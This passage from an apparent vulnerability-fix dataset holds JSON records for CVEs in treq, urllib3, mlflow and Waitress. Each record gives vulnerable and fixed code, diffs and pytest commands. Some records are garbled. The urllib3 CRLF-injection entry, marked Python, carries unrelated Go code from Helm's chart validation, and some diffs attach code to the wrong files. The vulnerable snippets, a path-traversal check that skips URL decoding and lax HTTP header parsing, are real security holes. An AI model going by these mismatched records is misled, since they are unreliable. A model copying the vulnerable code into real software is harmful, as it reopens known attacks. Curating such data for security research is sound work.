RedirectAgent(wrapped_agent)\n\n        wrapped_agent = ContentDecoderAgent(wrapped_agent,\n                                            [(b'gzip', GzipDecoder)])\n\n        if auth:\n            wrapped_agent = add_auth(wrapped_agent, auth)\n\n        d = wrapped_agent.request(\n            method, url, headers=headers,\n            bodyProducer=bodyProducer)\n\n        if reactor is None:\n            from twisted.internet import reactor\n        if timeout:\n            delayedCall = reactor.callLater(timeout, d.cancel)\n\n            def gotResult(result):\n                if delayedCall.active():\n                    delayedCall.cancel()\n                return result\n\n            d.addBoth(gotResult)\n\n        if not unbuffered:\n            d.addCallback(_BufferedResponse)\n\n        return d.addCallback(_Response, cookies)"
      },
      {
        "id": "fix_py_178_3",
        "commit": "1da6022",
        "file_path": "src/treq/client.py",
        "start_line": 46,
        "end_line": 93,
        "snippet": "def _scoped_cookiejar_from_dict(url_object, cookie_dict):\n    \"\"\"\n    Create a CookieJar from a dictionary whose cookies are all scoped to the\n    given URL's origin.\n\n    @note: This does not scope the cookies to any particular path, only the\n        host, port, and scheme of the given URL.\n    \"\"\"\n    cookie_jar = CookieJar()\n    if cookie_dict is None:\n        return cookie_jar\n    for k, v in cookie_dict.items():\n        secure = url_object.scheme == 'https'\n        port_specified = not (\n            (url_object.scheme == \"https\" and url_object.port == 443)\n            or (url_object.scheme == \"http\" and url_object.port == 80)\n        )\n        port = str(url_object.port)\n        domain = url_object.host\n        netscape_domain = domain if '.' in domain else domain + '.local'\n\n        cookie_jar.set_cookie(\n            Cookie(\n                # Scoping\n                domain=netscape_domain,\n                port=port,\n                secure=secure,\n                port_specified=port_specified,\n\n                # Contents\n                name=k,\n                value=v,\n\n                # Constant/always-the-same stuff\n                version=0,\n                path=\"/\",\n                expires=None,\n                discard=False,\n                comment=None,\n                comment_url=None,\n                rfc2109=False,\n                path_specified=False,\n                domain_specified=False,\n                domain_initial_dot=False,\n                rest=[],\n            )\n        )\n    return cookie_jar"
      }
    ],
    "vul_patch": "--- a/src/treq/client.py\n+++ b/src/treq/client.py\n@@ -1,5 +1,7 @@\n     def __init__(self, agent, cookiejar=None,\n                  data_to_body_producer=IBodyProducer):\n         self._agent = agent\n-        self._cookiejar = cookiejar or cookiejar_from_dict({})\n+        if cookiejar is None:\n+            cookiejar = CookieJar()\n+        self._cookiejar = cookiejar\n         self._data_to_body_producer = data_to_body_producer\n\n--- a/src/treq/client.py\n+++ b/src/treq/client.py\n@@ -50,7 +50,7 @@\n             headers.setRawHeaders(b'Content-Type', [contentType])\n \n         if not isinstance(cookies, CookieJar):\n-            cookies = cookiejar_from_dict(cookies)\n+            cookies = _scoped_cookiejar_from_dict(parsed_url, cookies)\n \n         cookies = merge_cookies(self._cookiejar, cookies)\n         wrapped_agent = CookieAgent(self._agent, cookies)\n\n--- /dev/null\n+++ b/src/treq/client.py\n@@ -0,0 +1,48 @@\n+def _scoped_cookiejar_from_dict(url_object, cookie_dict):\n+    \"\"\"\n+    Create a CookieJar from a dictionary whose cookies are all scoped to the\n+    given URL's origin.\n+\n+    @note: This does not scope the cookies to any particular path, only the\n+        host, port, and scheme of the given URL.\n+    \"\"\"\n+    cookie_jar = CookieJar()\n+    if cookie_dict is None:\n+        return cookie_jar\n+    for k, v in cookie_dict.items():\n+        secure = url_object.scheme == 'https'\n+        port_specified = not (\n+            (url_object.scheme == \"https\" and url_object.port == 443)\n+            or (url_object.scheme == \"http\" and url_object.port == 80)\n+        )\n+        port = str(url_object.port)\n+        domain = url_object.host\n+        netscape_domain = domain if '.' in domain else domain + '.local'\n+\n+        cookie_jar.set_cookie(\n+            Cookie(\n+                # Scoping\n+                domain=netscape_domain,\n+                port=port,\n+                secure=secure,\n+                port_specified=port_specified,\n+\n+                # Contents\n+                name=k,\n+                value=v,\n+\n+                # Constant/always-the-same stuff\n+                version=0,\n+                path=\"/\",\n+                expires=None,\n+                discard=False,\n+                comment=None,\n+                comment_url=None,\n+                rfc2109=False,\n+                path_specified=False,\n+                domain_specified=False,\n+                domain_initial_dot=False,\n+                rest=[],\n+            )\n+        )\n+    return cookie_jar\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-26137",
    "cve_description": "urllib3 before 1.25.9 allows CRLF injection if the attacker controls the HTTP request method, as demonstrated by inserting CR and LF control characters in the first argument of putrequest(). NOTE: this is similar to CVE-2020-26116.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/urllib3/urllib3",
    "patch_url": [
      "https://github.com/urllib3/urllib3/commit/1dd69c5c5982fae7c87a620d487c2ebf7a6b436b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_go_132_1",
        "commit": "860b1a9",
        "file_path": "pkg/chart/metadata.go",
        "start_line": 68,
        "end_line": 86,
        "snippet": "func (md *Metadata) Validate() error {\n\tif md == nil {\n\t\treturn ValidationError(\"chart.metadata is required\")\n\t}\n\tif md.APIVersion == \"\" {\n\t\treturn ValidationError(\"chart.metadata.apiVersion is required\")\n\t}\n\tif md.Name == \"\" {\n\t\treturn ValidationError(\"chart.metadata.name is required\")\n\t}\n\tif md.Version == \"\" {\n\t\treturn ValidationError(\"chart.metadata.version is required\")\n\t}\n\tif !isValidChartType(md.Type) {\n\t\treturn ValidationError(\"chart.metadata.type must be application or library\")\n\t}\n\t// TODO validate valid semver here?\n\treturn nil\n}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_go_132_1",
        "commit": "e7c2815",
        "file_path": "pkg/chart/metadata.go",
        "start_line": 68,
        "end_line": 95,
        "snippet": "func (md *Metadata) Validate() error {\n\tif md == nil {\n\t\treturn ValidationError(\"chart.metadata is required\")\n\t}\n\tif md.APIVersion == \"\" {\n\t\treturn ValidationError(\"chart.metadata.apiVersion is required\")\n\t}\n\tif md.Name == \"\" {\n\t\treturn ValidationError(\"chart.metadata.name is required\")\n\t}\n\tif md.Version == \"\" {\n\t\treturn ValidationError(\"chart.metadata.version is required\")\n\t}\n\tif !isValidChartType(md.Type) {\n\t\treturn ValidationError(\"chart.metadata.type must be application or library\")\n\t}\n\n\t// Aliases need to be validated here to make sure that the alias name does\n\t// not contain any illegal characters.\n\tfor _, dependency := range md.Dependencies {\n\t\tif err := validateDependency(dependency); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\t// TODO validate valid semver here?\n\treturn nil\n}"
      },
      {
        "id": "fix_go_132_2",
        "commit": "e7c2815",
        "file_path": "pkg/chart/chart.go",
        "start_line": 31,
        "end_line": 31,
        "snippet": "var aliasNameFormat = regexp.MustCompile(\"^[a-zA-Z0-9_-]+$\")"
      },
      {
        "id": "fix_go_132_3",
        "commit": "e7c2815",
        "file_path": "pkg/chart/errors.go",
        "start_line": 28,
        "end_line": 30,
        "snippet": "func ValidationErrorf(msg string, args ...interface{}) ValidationError {\n\treturn ValidationError(fmt.Sprintf(msg, args...))\n}"
      },
      {
        "id": "fix_go_132_4",
        "commit": "e7c2815",
        "file_path": "pkg/chart/metadata.go",
        "start_line": 108,
        "end_line": 113,
        "snippet": "func validateDependency(dep *Dependency) error {\n\tif len(dep.Alias) > 0 && !aliasNameFormat.MatchString(dep.Alias) {\n\t\treturn ValidationErrorf(\"dependency %q has disallowed characters in the alias\", dep.Name)\n\t}\n\treturn nil\n}"
      }
    ],
    "vul_patch": "--- a/pkg/chart/metadata.go\n+++ b/pkg/chart/metadata.go\n@@ -14,6 +14,15 @@\n \tif !isValidChartType(md.Type) {\n \t\treturn ValidationError(\"chart.metadata.type must be application or library\")\n \t}\n+\n+\t// Aliases need to be validated here to make sure that the alias name does\n+\t// not contain any illegal characters.\n+\tfor _, dependency := range md.Dependencies {\n+\t\tif err := validateDependency(dependency); err != nil {\n+\t\t\treturn err\n+\t\t}\n+\t}\n+\n \t// TODO validate valid semver here?\n \treturn nil\n }\n\n--- /dev/null\n+++ b/pkg/chart/metadata.go\n@@ -0,0 +1 @@\n+var aliasNameFormat = regexp.MustCompile(\"^[a-zA-Z0-9_-]+$\")\n\n--- /dev/null\n+++ b/pkg/chart/metadata.go\n@@ -0,0 +1,3 @@\n+func ValidationErrorf(msg string, args ...interface{}) ValidationError {\n+\treturn ValidationError(fmt.Sprintf(msg, args...))\n+}\n\n--- /dev/null\n+++ b/pkg/chart/metadata.go\n@@ -0,0 +1,6 @@\n+func validateDependency(dep *Dependency) error {\n+\tif len(dep.Alias) > 0 && !aliasNameFormat.MatchString(dep.Alias) {\n+\t\treturn ValidationErrorf(\"dependency %q has disallowed characters in the alias\", dep.Name)\n+\t}\n+\treturn nil\n+}\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-6831",
    "cve_description": "Path Traversal: '\\..\\filename' in GitHub repository mlflow/mlflow prior to 2.9.2.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_31_1",
        "commit": "9612ef0",
        "file_path": "mlflow/utils/uri.py",
        "start_line": 422,
        "end_line": 446,
        "snippet": "def validate_path_is_safe(path):\n    \"\"\"\n    Validates that the specified path is safe to join with a trusted prefix. This is a security\n    measure to prevent path traversal attacks.\n    A valid path should:\n        not contain separators other than '/'\n        not contain .. to navigate to parent dir in path\n        not be an absolute path\n    \"\"\"\n    from mlflow.utils.file_utils import local_file_uri_to_path\n\n    exc = MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)\n    if any((s in path) for s in (\"#\", \"%23\")):\n        raise exc\n\n    if is_file_uri(path):\n        path = local_file_uri_to_path(path)\n    if (\n        any((s in path) for s in _OS_ALT_SEPS)\n        or \"..\" in path.split(\"/\")\n        or pathlib.PureWindowsPath(path).is_absolute()\n        or pathlib.PurePosixPath(path).is_absolute()\n        or (is_windows() and len(path) >= 2 and path[1] == \":\")\n    ):\n        raise exc"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_31_1",
        "commit": "1da75df",
        "file_path": "mlflow/utils/uri.py",
        "start_line": 422,
        "end_line": 449,
        "snippet": "def validate_path_is_safe(path):\n    \"\"\"\n    Validates that the specified path is safe to join with a trusted prefix. This is a security\n    measure to prevent path traversal attacks.\n    A valid path should:\n        not contain separators other than '/'\n        not contain .. to navigate to parent dir in path\n        not be an absolute path\n    \"\"\"\n    from mlflow.utils.file_utils import local_file_uri_to_path\n\n    # We must decode URL before validating it\n    path = urllib.parse.unquote(path)\n\n    exc = MlflowException(\"Invalid path\", error_code=INVALID_PARAMETER_VALUE)\n    if any((s in path) for s in (\"#\", \"%23\")):\n        raise exc\n\n    if is_file_uri(path):\n        path = local_file_uri_to_path(path)\n    if (\n        any((s in path) for s in _OS_ALT_SEPS)\n        or \"..\" in path.split(\"/\")\n        or pathlib.PureWindowsPath(path).is_absolute()\n        or pathlib.PurePosixPath(path).is_absolute()\n        or (is_windows() and len(path) >= 2 and path[1] == \":\")\n    ):\n        raise exc"
      }
    ],
    "vul_patch": "--- a/mlflow/utils/uri.py\n+++ b/mlflow/utils/uri.py\n@@ -9,7 +9,10 @@\n     \"\"\"\n     from mlflow.utils.file_utils import local_file_uri_to_path\n \n-    exc = MlflowException(f\"Invalid path: {path}\", error_code=INVALID_PARAMETER_VALUE)\n+    # We must decode URL before validating it\n+    path = urllib.parse.unquote(path)\n+\n+    exc = MlflowException(\"Invalid path\", error_code=INVALID_PARAMETER_VALUE)\n     if any((s in path) for s in (\"#\", \"%23\")):\n         raise exc\n \n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-6831:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/mlflow\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-6831/bin/python -m pytest tests/server/test_handlers.py::test_delete_artifact_mlflow_artifacts_throws_for_malicious_path tests/store/artifact/test_http_artifact_repo.py::test_list_artifacts_malicious_path tests/utils/test_uri.py::test_validate_path_is_safe_bad -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-6831:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/mlflow\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-6831/bin/python -m pytest tests/server/test_handlers.py tests/store/artifact/test_http_artifact_repo.py tests/utils/test_uri.py -k \"not test_mlflow_server_with_installed_plugin and not test_list_artifacts_malicious_path\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2019-16789",
    "cve_description": "In Waitress through version 1.4.0, if a proxy server is used in front of waitress, an invalid request may be sent by an attacker that bypasses the front-end and is parsed differently by waitress leading to a potential for HTTP request smuggling. Specially crafted requests containing special whitespace characters in the Transfer-Encoding header would get parsed by Waitress as being a chunked request, but a front-end server would use the Content-Length instead as the Transfer-Encoding header is considered invalid due to containing invalid characters. If a front-end server does HTTP pipelining to a backend Waitress server this could lead to HTTP request splitting which may lead to potential cache poisoning or unexpected information disclosure. This issue is fixed in Waitress 1.4.1 through more strict HTTP field validation.",
    "cwe_info": {
      "CWE-444": {
        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
        "description": "The product acts as an intermediary HTTP agent\n         (such as a proxy or firewall) in the data flow between two\n         entities such as a client and server, but it does not\n         interpret malformed HTTP requests or responses in ways that\n         are consistent with how the messages will be processed by\n         those entities that are at the ultimate destination."
      }
    },
    "repo": "https://github.com/Pylons/waitress",
    "patch_url": [
      "https://github.com/Pylons/waitress/commit/11d9e138125ad46e951027184b13242a3c1de017"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_72_1",
        "commit": "f11093a",
        "file_path": "waitress/parser.py",
        "start_line": 190,
        "end_line": 297,
        "snippet": "    def parse_header(self, header_plus):\n        \"\"\"\n        Parses the header_plus block of text (the headers plus the\n        first line of the request).\n        \"\"\"\n        index = header_plus.find(b\"\\r\\n\")\n        if index >= 0:\n            first_line = header_plus[:index].rstrip()\n            header = header_plus[index + 2 :]\n        else:\n            raise ParsingError(\"HTTP message header invalid\")\n\n        if b\"\\r\" in first_line or b\"\\n\" in first_line:\n            raise ParsingError(\"Bare CR or LF found in HTTP message\")\n\n        self.first_line = first_line  # for testing\n\n        lines = get_header_lines(header)\n\n        headers = self.headers\n        for line in lines:\n            index = line.find(b\":\")\n            if index > 0:\n                key = line[:index]\n\n                if key != key.strip():\n                    raise ParsingError(\"Invalid whitespace after field-name\")\n\n                if b\"_\" in key:\n                    continue\n                value = line[index + 1 :].strip()\n                key1 = tostr(key.upper().replace(b\"-\", b\"_\"))\n                # If a header already exists, we append subsequent values\n                # seperated by a comma. Applications already need to handle\n                # the comma seperated values, as HTTP front ends might do\n                # the concatenation for you (behavior specified in RFC2616).\n                try:\n                    headers[key1] += tostr(b\", \" + value)\n                except KeyError:\n                    headers[key1] = tostr(value)\n            # else there's garbage in the headers?\n\n        # command, uri, version will be bytes\n        command, uri, version = crack_first_line(first_line)\n        version = tostr(version)\n        command = tostr(command)\n        self.command = command\n        self.version = version\n        (\n            self.proxy_scheme,\n            self.proxy_netloc,\n            self.path,\n            self.query,\n            self.fragment,\n        ) = split_uri(uri)\n        self.url_scheme = self.adj.url_scheme\n        connection = headers.get(\"CONNECTION\", \"\")\n\n        if version == \"1.0\":\n            if connection.lower() != \"keep-alive\":\n                self.connection_close = True\n\n        if version == \"1.1\":\n            # since the server buffers data from chunked transfers and clients\n            # never need to deal with chunked requests, downstream clients\n            # should not see the HTTP_TRANSFER_ENCODING header; we pop it\n            # here\n            te = headers.pop(\"TRANSFER_ENCODING\", \"\")\n\n            encodings = [encoding.strip().lower() for encoding in te.split(\",\") if encoding]\n\n            for encoding in encodings:\n                # Out of the transfer-codings listed in\n                # https://tools.ietf.org/html/rfc7230#section-4 we only support\n                # chunked at this time.\n\n                # Note: the identity transfer-coding was removed in RFC7230:\n                # https://tools.ietf.org/html/rfc7230#appendix-A.2 and is thus\n                # not supported\n                if encoding not in {\"chunked\"}:\n                    raise TransferEncodingNotImplemented(\n                        \"Transfer-Encoding requested is not supported.\"\n                    )\n\n            if encodings and encodings[-1] == \"chunked\":\n                self.chunked = True\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = ChunkedReceiver(buf)\n            elif encodings:  # pragma: nocover\n                raise TransferEncodingNotImplemented(\n                    \"Transfer-Encoding requested is not supported.\"\n                )\n\n            expect = headers.get(\"EXPECT\", \"\").lower()\n            self.expect_continue = expect == \"100-continue\"\n            if connection.lower() == \"close\":\n                self.connection_close = True\n\n        if not self.chunked:\n            try:\n                cl = int(headers.get(\"CONTENT_LENGTH\", 0))\n            except ValueError:\n                raise ParsingError(\"Content-Length is invalid\")\n\n            self.content_length = cl\n            if cl > 0:\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = FixedStreamReceiver(cl, buf)"
      },
      {
        "id": "vul_py_72_2",
        "commit": "f11093a",
        "file_path": "waitress/parser.py",
        "start_line": 348,
        "end_line": 365,
        "snippet": "def get_header_lines(header):\n    \"\"\"\n    Splits the header into lines, putting multi-line headers together.\n    \"\"\"\n    r = []\n    lines = header.split(b\"\\r\\n\")\n    for line in lines:\n        if b\"\\r\" in line or b\"\\n\" in line:\n            raise ParsingError('Bare CR or LF found in header line \"%s\"' % tostr(line))\n\n        if line.startswith((b\" \", b\"\\t\")):\n            if not r:\n                # https://corte.si/posts/code/pathod/pythonservers/index.html\n                raise ParsingError('Malformed header line \"%s\"' % tostr(line))\n            r[-1] += line\n        else:\n            r.append(line)\n    return r"
      },
      {
        "id": "vul_py_72_3",
        "commit": "f11093a",
        "file_path": "waitress/utilities.py",
        "start_line": 211,
        "end_line": 218,
        "snippet": "vchar_re = \"\\x21-\\x7e\"\n\n# RFC 7230 Section 3.2.6 \"Field Value Components\":\n# quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE\n# qdtext        = HTAB / SP /%x21 / %x23-5B / %x5D-7E / obs-text\n# obs-text      = %x80-FF\n# quoted-pair   = \"\\\" ( HTAB / SP / VCHAR / obs-text )\nobs_text_re = \"\\x80-\\xff\""
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_72_1",
        "commit": "11d9e138125ad46e951027184b13242a3c1de017",
        "file_path": "waitress/parser.py",
        "start_line": 190,
        "end_line": 298,
        "snippet": "    def parse_header(self, header_plus):\n        \"\"\"\n        Parses the header_plus block of text (the headers plus the\n        first line of the request).\n        \"\"\"\n        index = header_plus.find(b\"\\r\\n\")\n        if index >= 0:\n            first_line = header_plus[:index].rstrip()\n            header = header_plus[index + 2 :]\n        else:\n            raise ParsingError(\"HTTP message header invalid\")\n\n        if b\"\\r\" in first_line or b\"\\n\" in first_line:\n            raise ParsingError(\"Bare CR or LF found in HTTP message\")\n\n        self.first_line = first_line  # for testing\n\n        lines = get_header_lines(header)\n\n        headers = self.headers\n        for line in lines:\n            header = HEADER_FIELD.match(line)\n\n            if not header:\n                raise ParsingError(\"Invalid header\")\n\n            key, value = header.group('name', 'value')\n\n            if b\"_\" in key:\n                # TODO(xistence): Should we drop this request instead?\n                continue\n\n            value = value.strip()\n            key1 = tostr(key.upper().replace(b\"-\", b\"_\"))\n            # If a header already exists, we append subsequent values\n            # seperated by a comma. Applications already need to handle\n            # the comma seperated values, as HTTP front ends might do\n            # the concatenation for you (behavior specified in RFC2616).\n            try:\n                headers[key1] += tostr(b\", \" + value)\n            except KeyError:\n                headers[key1] = tostr(value)\n\n        # command, uri, version will be bytes\n        command, uri, version = crack_first_line(first_line)\n        version = tostr(version)\n        command = tostr(command)\n        self.command = command\n        self.version = version\n        (\n            self.proxy_scheme,\n            self.proxy_netloc,\n            self.path,\n            self.query,\n            self.fragment,\n        ) = split_uri(uri)\n        self.url_scheme = self.adj.url_scheme\n        connection = headers.get(\"CONNECTION\", \"\")\n\n        if version == \"1.0\":\n            if connection.lower() != \"keep-alive\":\n                self.connection_close = True\n\n        if version == \"1.1\":\n            # since the server buffers data from chunked transfers and clients\n            # never need to deal with chunked requests, downstream clients\n            # should not see the HTTP_TRANSFER_ENCODING header; we pop it\n            # here\n            te = headers.pop(\"TRANSFER_ENCODING\", \"\")\n\n            encodings = [encoding.strip().lower() for encoding in te.split(\",\") if encoding]\n\n            for encoding in encodings:\n                # Out of the transfer-codings listed in\n                # https://tools.ietf.org/html/rfc7230#section-4 we only support\n                # chunked at this time.\n\n                # Note: the identity transfer-coding was removed in RFC7230:\n                # https://tools.ietf.org/html/rfc7230#appendix-A.2 and is thus\n                # not supported\n                if encoding not in {\"chunked\"}:\n                    raise TransferEncodingNotImplemented(\n                        \"Transfer-Encoding requested is not supported.\"\n                    )\n\n            if encodings and encodings[-1] == \"chunked\":\n                self.chunked = True\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = ChunkedReceiver(buf)\n            elif encodings:  # pragma: nocover\n                raise TransferEncodingNotImplemented(\n                    \"Transfer-Encoding requested is not supported.\"\n                )\n\n            expect = headers.get(\"EXPECT\", \"\").lower()\n            self.expect_continue = expect == \"100-continue\"\n            if connection.lower() == \"close\":\n                self.connection_close = True\n\n        if not self.chunked:\n            try:\n                cl = int(headers.get(\"CONTENT_LENGTH\", 0))\n            except ValueError:\n                raise ParsingError(\"Content-Length is invalid\")\n\n            self.content_length = cl\n            if cl > 0:\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = FixedStreamReceiver(cl, buf)"
      },
      {
        "id": "fix_py_72_2",
        "commit": "11d9e138125ad46e951027184b13242a3c1de017",
        "file_path": "waitress/parser.py",
        "start_line": 349,
        "end_line": 376,
        "snippet": "def get_header_lines(header):\n    \"\"\"\n    Splits the header into lines, putting multi-line headers together.\n    \"\"\"\n    r = []\n    lines = header.split(b\"\\r\\n\")\n    for line in lines:\n        if not line:\n            continue\n\n        if b\"\\r\" in line or b\"\\n\" in line:\n            raise ParsingError('Bare CR or LF found in header line \"%s\"' % tostr(line))\n\n        if line.startswith((b\" \", b\"\\t\")):\n            if not r:\n                # https://corte.si/posts/code/pathod/pythonservers/index.html\n                raise ParsingError('Malformed header line \"%s\"' % tostr(line))\n            r[-1] += line\n        else:\n            r.append(line)\n    return r\n\n\nfirst_line_re = re.compile(\n    b\"([^ ]+) \"\n    b\"((?:[^ :?#]+://[^ ?#/]*(?:[0-9]{1,5})?)?[^ ]+)\"\n    b\"(( HTTP/([0-9.]+))$|$)\"\n)"
      },
      {
        "id": "fix_py_72_3",
        "commit": "11d9e138125ad46e951027184b13242a3c1de017",
        "file_path": "waitress/utilities.py",
        "start_line": 222,
        "end_line": 229,
        "snippet": "vchar_re = VCHAR\n\n# RFC 7230 Section 3.2.6 \"Field Value Components\":\n# quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE\n# qdtext        = HTAB / SP /%x21 / %x23-5B / %x5D-7E / obs-text\n# obs-text      = %x80-FF\n# quoted-pair   = \"\\\" ( HTAB / SP / VCHAR / obs-text )\nobs_text_re = OBS_TEXT"
      },
      {
        "id": "fix_py_72_4",
        "commit": "11d9e138125ad46e951027184b13242a3c1de017",
        "file_path": "waitress/rfc7230.py",
        "start_line": 1,
        "end_line": 44,
        "snippet": "\"\"\"\nThis contains a bunch of RFC7230 definitions and regular expressions that are\nneeded to properly parse HTTP messages.\n\"\"\"\n\nimport re\n\nfrom .compat import tobytes\n\nWS = \"[ \\t]\"\nOWS = WS + \"{0,}?\"\nRWS = WS + \"{1,}?\"\nBWS = OWS\n\n# RFC 7230 Section 3.2.6 \"Field Value Components\":\n# tchar          = \"!\" / \"#\" / \"$\" / \"%\" / \"&\" / \"'\" / \"*\"\n#                / \"+\" / \"-\" / \".\" / \"^\" / \"_\" / \"`\" / \"|\" / \"~\"\n#                / DIGIT / ALPHA\n# obs-text      = %x80-FF\nTCHAR = r\"[!#$%&'*+\\-.^_`|~0-9A-Za-z]\"\nOBS_TEXT = r\"\\x80-\\xff\"\n\nTOKEN = TCHAR + \"{1,}\"\n\n# RFC 5234 Appendix B.1 \"Core Rules\":\n# VCHAR         =  %x21-7E\n#                  ; visible (printing) characters\nVCHAR = r\"\\x21-\\x7e\"\n\n# header-field   = field-name \":\" OWS field-value OWS\n# field-name     = token\n# field-value    = *( field-content / obs-fold )\n# field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]\n# field-vchar    = VCHAR / obs-text\n\nFIELD_VCHAR = \"[\" + VCHAR + OBS_TEXT + \"]\"\nFIELD_CONTENT = FIELD_VCHAR + \"(\" + RWS + FIELD_VCHAR + \"){0,}\"\nFIELD_VALUE = \"(\" + FIELD_CONTENT + \"){0,}\"\n\nHEADER_FIELD = re.compile(\n    tobytes(\n        \"^(?P<name>\" + TOKEN + \"):\" + OWS + \"(?P<value>\" + FIELD_VALUE + \")\" + OWS + \"$\"\n    )\n)"
      }
    ],
    "vul_patch": "--- a/waitress/parser.py\n+++ b/waitress/parser.py\n@@ -19,26 +19,27 @@\n \n         headers = self.headers\n         for line in lines:\n-            index = line.find(b\":\")\n-            if index > 0:\n-                key = line[:index]\n+            header = HEADER_FIELD.match(line)\n \n-                if key != key.strip():\n-                    raise ParsingError(\"Invalid whitespace after field-name\")\n+            if not header:\n+                raise ParsingError(\"Invalid header\")\n \n-                if b\"_\" in key:\n-                    continue\n-                value = line[index + 1 :].strip()\n-                key1 = tostr(key.upper().replace(b\"-\", b\"_\"))\n-                # If a header already exists, we append subsequent values\n-                # seperated by a comma. Applications already need to handle\n-                # the comma seperated values, as HTTP front ends might do\n-                # the concatenation for you (behavior specified in RFC2616).\n-                try:\n-                    headers[key1] += tostr(b\", \" + value)\n-                except KeyError:\n-                    headers[key1] = tostr(value)\n-            # else there's garbage in the headers?\n+            key, value = header.group('name', 'value')\n+\n+            if b\"_\" in key:\n+                # TODO(xistence): Should we drop this request instead?\n+                continue\n+\n+            value = value.strip()\n+            key1 = tostr(key.upper().replace(b\"-\", b\"_\"))\n+            # If a header already exists, we append subsequent values\n+            # seperated by a comma. Applications already need to handle\n+            # the comma seperated values, as HTTP front ends might do\n+            # the concatenation for you (behavior specified in RFC2616).\n+            try:\n+                headers[key1] += tostr(b\", \" + value)\n+            except KeyError:\n+                headers[key1] = tostr(value)\n \n         # command, uri, version will be bytes\n         command, uri, version = crack_first_line(first_line)\n\n--- a/waitress/parser.py\n+++ b/waitress/parser.py\n@@ -5,6 +5,9 @@\n     r = []\n     lines = header.split(b\"\\r\\n\")\n     for line in lines:\n+        if not line:\n+            continue\n+\n         if b\"\\r\" in line or b\"\\n\" in line:\n             raise ParsingError('Bare CR or LF found in header line \"%s\"' % tostr(line))\n \n@@ -16,3 +19,10 @@\n         else:\n             r.append(line)\n     return r\n+\n+\n+first_line_re = re.compile(\n+    b\"([^ ]+) \"\n+    b\"((?:[^ :?#]+://[^ ?#/]*(?:[0-9]{1,5})?)?[^ ]+)\"\n+    b\"(( HTTP/([0-9.]+))$|$)\"\n+)\n\n--- a/waitress/utilities.py\n+++ b/waitress/utilities.py\n@@ -1,8 +1,8 @@\n-vchar_re = \"\\x21-\\x7e\"\n+vchar_re = VCHAR\n \n # RFC 7230 Section 3.2.6 \"Field Value Components\":\n # quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE\n # qdtext        = HTAB / SP /%x21 / %x23-5B / %x5D-7E / obs-text\n # obs-text      = %x80-FF\n # quoted-pair   = \"\\\" ( HTAB / SP / VCHAR / obs-text )\n-obs_text_re = \"\\x80-\\xff\"\n+obs_text_re = OBS_TEXT\n\n--- /dev/null\n+++ b/waitress/utilities.py\n@@ -0,0 +1,44 @@\n+\"\"\"\n+This contains a bunch of RFC7230 definitions and regular expressions that are\n+needed to properly parse HTTP messages.\n+\"\"\"\n+\n+import re\n+\n+from .compat import tobytes\n+\n+WS = \"[ \\t]\"\n+OWS = WS + \"{0,}?\"\n+RWS = WS + \"{1,}?\"\n+BWS = OWS\n+\n+# RFC 7230 Section 3.2.6 \"Field Value Components\":\n+# tchar          = \"!\" / \"#\" / \"$\" / \"%\" / \"&\" / \"'\" / \"*\"\n+#                / \"+\" / \"-\" / \".\" / \"^\" / \"_\" / \"`\" / \"|\" / \"~\"\n+#                / DIGIT / ALPHA\n+# obs-text      = %x80-FF\n+TCHAR = r\"[!#$%&'*+\\-.^_`|~0-9A-Za-z]\"\n+OBS_TEXT = r\"\\x80-\\xff\"\n+\n+TOKEN = TCHAR + \"{1,}\"\n+\n+# RFC 5234 Appendix B.1 \"Core Rules\":\n+# VCHAR         =  %x21-7E\n+#                  ; visible (printing) characters\n+VCHAR = r\"\\x21-\\x7e\"\n+\n+# header-field   = field-name \":\" OWS field-value OWS\n+# field-name     = token\n+# field-value    = *( field-content / obs-fold )\n+# field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]\n+# field-vchar    = VCHAR / obs-text\n+\n+FIELD_VCHAR = \"[\" + VCHAR + 